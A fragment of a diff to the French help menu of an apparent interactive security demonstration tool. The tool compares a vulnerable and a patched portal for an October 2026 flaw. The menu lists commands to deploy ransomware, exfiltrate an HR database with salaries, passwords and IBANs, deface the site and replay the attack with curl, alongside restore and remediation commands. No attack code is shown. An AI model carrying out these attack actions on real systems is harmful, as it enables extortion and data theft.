+    print(f"{'─' * LARGEUR}{C.RESET}\n")
 
 
-# ══════════════════════════════════════════════════════════════════════
-#  Boucle interactive
-# ══════════════════════════════════════════════════════════════════════
-AIDE = f"""
-{C.BOLD}COMMANDES DISPONIBLES{C.RESET}
+# ──────────────── Boucle interactive ────────────────
+AIDE = f"""\n{C.BOLD}COMMANDES DISPONIBLES{C.RESET}
   {C.CYAN}status{C.RESET}                     état des deux serveurs (versions, verrou)
   {C.CYAN}histoire{C.RESET}                   la chronologie réelle de la faille (octobre 2026)
   {C.CYAN}expliquer{C.RESET}                   explication grand public + version technique
@@ -608,8 +506,8 @@ AIDE = f"""
   {C.CYAN}recette{C.RESET}                    reproduction manuelle (curl) pour montrer que tu pilotes
   {C.CYAN}ransomware [cible]{C.RESET}          déploie le rançongiciel sur le portail
   {C.CYAN}vol [cible]{C.RESET}                exfiltre la base RH (salaires, mots de passe, IBAN)
-  {C.CYAN}deface [cible]{C.RESET}             déface le site
-  {C.CYAN}restore [cible]{C.RESET}            remet le(s) portail(s) à l'état normal
+  {C.CYAN}deface [cible]{C.RESET}             défacer le site web
+  {C.CYAN}restore [cible]{C.RESET}            remet le(s) portail(s) à la normale
   {C.CYAN}duel{C.RESET}                       la même attaque sur vulnérable vs corrigé
   {C.CYAN}remediation{C.RESET}                le plan de correction réel (avec commandes)
   {C.CYAN}demo{C.RESET}                       déroulé guidé complet (parfait pour animer)
